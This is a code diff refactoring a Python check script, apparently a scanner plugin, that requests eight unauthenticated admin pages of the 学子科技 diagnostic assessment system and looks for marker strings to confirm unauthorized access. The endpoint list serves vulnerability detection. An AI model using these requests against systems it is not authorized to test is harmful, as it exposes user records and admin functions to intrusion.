@@ -9,27 +9,20 @@ description: 多处未授权访问。
 import sys
 import requests
 import warnings
-
-
-
-class xuezi_ceping_unauth:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['学子科技诊断测评系统多处未授权访问','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         vulnurls = [
-            self.url + '/ceping/HouAdmin/GLGWUsers.aspx',
-            self.url + '/ceping/HouAdmin/GLComUser.aspx',
-            self.url + '/ceping/HouAdmin/GLComleibie2.aspx',
-            self.url + '/ceping/HouAdmin/GL_Shitileibie.aspx',
-            self.url + '/ceping/HouAdmin/GL_PingFen.aspx',
-            self.url + '/ceping/HouAdmin/GL_FenXiFuDao.aspx',
-            self.url + '/ceping/HouAdmin/MailSection.aspx',
-            self.url + '/ceping/HouAdmin/sendmails.aspx'
+            url + '/ceping/HouAdmin/GLGWUsers.aspx',
+            url + '/ceping/HouAdmin/GLComUser.aspx',
+            url + '/ceping/HouAdmin/GLComleibie2.aspx',
+            url + '/ceping/HouAdmin/GL_Shitileibie.aspx',
+            url + '/ceping/HouAdmin/GL_PingFen.aspx',
+            url + '/ceping/HouAdmin/GL_FenXiFuDao.aspx',
+            url + '/ceping/HouAdmin/MailSection.aspx',
+            url + '/ceping/HouAdmin/sendmails.aspx'
         ]
         verifys = [
             '注册时间',
@@ -60,5 +53,4 @@ class xuezi_ceping_unauth:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = xuezi_ceping_unauth(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
